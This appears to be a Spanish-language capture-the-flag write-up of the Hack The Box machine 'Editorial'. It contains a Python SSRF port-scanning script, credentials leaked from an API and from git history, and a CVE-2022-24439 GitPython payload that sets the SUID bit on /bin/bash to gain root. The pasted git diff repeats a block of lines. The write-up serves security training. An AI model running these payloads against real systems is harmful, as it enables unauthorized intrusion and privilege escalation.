---
layout: post
title: Editorial
image: /assets/img/machines/editorial/logo.JPG
accent_image:
  background: url('/assets/img/guero.jpg') center/cover
  overlay: false
subtitle: "Easy Machine"
tags: [htb]
---

# Editorial

Los primero pasos es escanear la máquina para saber que puertos están abiertos.

```cmd
# Nmap 7.93 scan initiated Sun Jun 23 19:10:57 2024 as: nmap -p22,80 -sCV -oN targeted 10.10.11.20
Nmap scan report for editorial.htb (10.10.11.20)
Host is up (0.079s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0dedb29ce253fbd4c8c1196e7580d864 (ECDSA)
|_  256 0fb9a7510e00d57b5b7c5fbf2bed53a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Editorial Tiempo Arriba
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 23 19:11:07 2024 -- 1 IP address (1 host up) scanned in 9.78 seconds
```
Revisando el puerto 80 vemos que tenemos un sitio web donde podemos subir un archivo de texto. En este nos muestra dos opciones: `url` y `adjuntando`. Siempre que tenemos un campo donde podemos apuntar a alguna URL es recomendable probar un ataque de `SSRF`.

![imagen1](/assets/img/machines/editorial/editorial1.jpg)

![imagen2](/assets/img/machines/editorial/editorial2.jpg)

Procedemos a interceptar la petición con `Burpsuite`, podemos ver que se manda una petición `POST`. Al intentar apuntar a la máquina local, vemos que no tienen ningun bloqueo. Intentar puerto por puerto manualmente nos llevará bastante tiempo, por lo que, creé un script en python para hacer este trabajo.

```python
import requests
import pwn
import threading
import queue

url = "http://editorial.htb/upload-cover"
proxy = {"http":"127.0.0.1:8080"}
header = {"Content-Type":"multipart/form-data; boundary=----WebKitFormBoundaryxCyQMtVBFzp73HTl"}
pwnlogs = pwn.log

def fuzzing(data):
    s = requests.session()
    r = s.post(url=url, data=data, proxies=proxy, headers=header)
    clength = r.headers.get("Content-Length")
    return clength

def worker(port_queue):
    while not port_queue.empty():
        i = port_queue.get()
        data = f"""------WebKitFormBoundaryxCyQMtVBFzp73HTl\nContent-Disposition: form-data; name="bookurl"\n\nhttp://127.0.0.1:{i}\n------WebKitFormBoundaryxCyQMtVBFzp73HTl\nContent-Disposition: form-data; name="bookfile"; filename=""\nContent-Type: application/octet-stream\n\n\n------WebKitFormBoundaryxCyQMtVBFzp73HTl--"""

        response_length = fuzzing(data)
        if response_length != "61":
            print(f"Puerto:{i} encontrado")

        port_queue.task_done()

def main():
    pwnlogs.info("Iniciando fuerza bruta")
    progress = pwnlogs.progress("Probando puertos")

    port_queue = queue.Queue()

    for i in range(1, 65535):
        port_queue.put(i)

    num_threads = 30
    threads = []

    for _ in range(num_threads):
        thread = threading.Thread(target=worker, args=(port_queue,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == '__main__':
    main()
```
Para este script utilizamos hilos para que haga más rápido el trabajo, el ejecutarlo nos encontramo con lo siguiente.

```shell
guero@guero$ python3 exploit.py
[*] Iniciando fuerza bruta
[<] Probando puertos
Puerto:5000 encontrado
```
Vemos que pasa cuando ponemos este puerto en la petición de burpsuite.Nos arroja una liga donde podemos descargar un archivo. Para esto lo intenté unas cuántas veces porque me daba errores la liga.

![imagen3](/assets/img/machines/editorial/editorial3.jpg)

```shell
guero@guero$ wget http://editorial.htb/static/uploads/33bf0431-5b5e-4d19-896a-1f18aa797401
--2024-06-23 19:29:56--  http://editorial.htb/static/uploads/33bf0431-5b5e-4d19-896a-1f18aa797401
Resolving editorial.htb (editorial.htb)... 10.10.11.20
Connecting to editorial.htb (editorial.htb)|10.10.11.20|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 911 [application/octet-stream]
Saving to: ‘33bf0431-5b5e-4d19-896a-1f18aa797401’

33bf0431-5b5e-4d19-896a-1f18aa797401       100%[======================================================================================>]     911  --.-KB/s    in 0s      

2024-06-23 19:29:56 (122 MB/s) - ‘33bf0431-5b5e-4d19-896a-1f18aa797401’ saved [911/911]
```
Nos encontramos con un archivo que contiene datos de alguna api

```shell
guero@guero$ cat 33bf0431-5b5e-4d19-896a-1f18aa797401 | jq
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```
Realizamos el mismo procedimiento para ver estos endpoints

![imagen4](/assets/img/machines/editorial/editorial4.jpg)

```shell
guero@guero$ curl -s http://editorial.htb/static/uploads/86f4bfec-ccce-4ab3-b012-0901752e0318  | jq
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
}
```
Nos encontramos con un usuario y contraseña, al probarlo con ssh podemos entrar al sistema.

```shell
ssh dev@editorial.htb 
The authenticity of host 'editorial.htb (10.10.11.20)' can't be established.
ED25519 key fingerprint is SHA256:YR+ibhVYSWNLe4xyiPA0g45F4p1pNAcQ7+xupfIR70Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'editorial.htb' (ED25519) to the list of known hosts.
dev@editorial.htb's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Jun 24 01:43:24 AM UTC 2024

  System load:           0.0
  Usage of /:            61.5% of 6.35GB
  Memory usage:          13%
  Swap usage:            0%
  Processes:             224
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.20
  IPv6 address for eth0: dead:beef::250:56ff:feb0:e7c3

```
Dentro encontramos la carpeta app y dentro encontramos un archivo .git, al tener el programa instalado en la máquina podemos ver los logs históricos, en uno de ellos podemos ver la contraseña del usuario prod.

```git
-bash-5.1$ ls -la
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5 14:36 .
drwxr-x--- 4 dev dev 4096 Jun  5 14:36 ..
drwxr-xr-x 8 dev dev 4096 Jun 24 01:45 .git
-bash-5.1$ git log
commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:04:21 2023 -0500

    fix: bugfix in api port endpoint

commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:01:11 2023 -0500

    change: remove debug and update api port

<SNIP>

commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:48:43 2023 -0500

    feat: create editorial app

-bash-5.1$ git diff 1e84a036b2f33c59e2390730699a488c65643d28
diff --git a/app_api/app.py b/app_api/app.py
deleted file mode 100644
index 61b786f..0000000
--- a/app_api/app.py
+++ /dev/null
@@ -1,74 +0,0 @@
--- a/app_api/app.py
+++ /dev/null
@@ -1,74 +0,0 @@
-# API (in development).
-# * To retrieve info about editorial
-
-import json
-from flask import Flask, jsonify
-
-# -------------------------------
-# App configuration
-# -------------------------------
-app = Flask(__name__)
-
-# -------------------------------
-# Global Variables
-# -------------------------------
-api_route = "/api/latest/metadata"
-api_editorial_name = "Editorial Tiempo Arriba"
-api_editorial_email = "info@tiempoarriba.htb"
-
-# -------------------------------
-# API routes
-# -------------------------------
-# -- : home
-@app.route('/api', methods=['GET'])
-def index():
-    data_editorial = {
-        'version': [{
-            '1': {
-                'editorial': 'Editorial El Tiempo Por Arriba', 
-                'contact_email_1': 'soporte@tiempoarriba.oc',
-                'contact_email_2': 'info@tiempoarriba.oc',
-                'api_route': '/api/v1/metadata/'
-            }},
-            {
-            '1.1': {
-                'editorial': 'Ed Tiempo Arriba', 
-                'contact_email_1': 'soporte@tiempoarriba.oc',
-                'contact_email_2': 'info@tiempoarriba.oc',
-                'api_route': '/api/v1.1/metadata/'
-            }},
-            {
-            '1.2': {
-                'editorial': api_editorial_name, 
-                'contact_email_1': 'soporte@tiempoarriba.oc',
-                'contact_email_2': 'info@tiempoarriba.oc',
-                'api_route': f'/api/v1.2/metadata/'
-            }},
-            {
-            '2': {
-                'editorial': api_editorial_name, 
-                'contact_email': 'info@tiempoarriba.moc.oc',
-                'api_route': f'/api/v2/metadata/'
-            }},
-            {
-            '2.3': {
-                'editorial': api_editorial_name, 
-                'contact_email': api_editorial_email,
-                'api_route': f'{api_route}/'
-            }
-        }]
-    }
-    return jsonify(data_editorial)
-
-# -- : (development) mail message to new authors
-            }},
-            {
-            '2': {
-                'editorial': api_editorial_name, 
-                'contact_email': 'info@tiempoarriba.moc.oc',
-                'api_route': f'/api/v2/metadata/'
-            }},
-            {
-            '2.3': {
-                'editorial': api_editorial_name, 
-                'contact_email': api_editorial_email,
-                'api_route': f'{api_route}/'
-            }
-        }]
-    }
-    return jsonify(data_editorial)
-
-# -- : (development) mail message to new authors
-@app.route(api_route + '/authors/message', methods=['GET'])
-def api_mail_new_authors():
-    return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
-    }) # TODO: replace dev credentials when checks pass
-
-# -------------------------------
-# Start program
-# -------------------------------
-if __name__ == '__main__':
-    app.run(host='127.0.0.1', port=5001, debug=True)
```
Con estas contraseñas podemos cambiar al usuario `prod` y viendo sus permisos sudo vemos lo siguiente:

```shell
-bash-5.1$ su prod
Password: 
bash-5.1$ whoami
prod
bash-5.1$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```
Este script contiene lo siguiente:

```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```
Investigando un poco nos encontramos con la vulnerabilidad [CVE-2022-24439](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858), realizamos lo siguiente para obtener una bash con privilegios.

```shell
bash-5.1$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% u+s /bin/bash'
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c chmod% u+s /bin/bash new_changes
  stderr: 'Cloning into 'new_changes'...
chmod: missing operand after 'u+s'
Try 'chmod --help' for more information.
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
'
bash-5.1$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14 11:31 /bin/bash
bash-5.1$ bash -p
bash-5.1# whoami
root
```
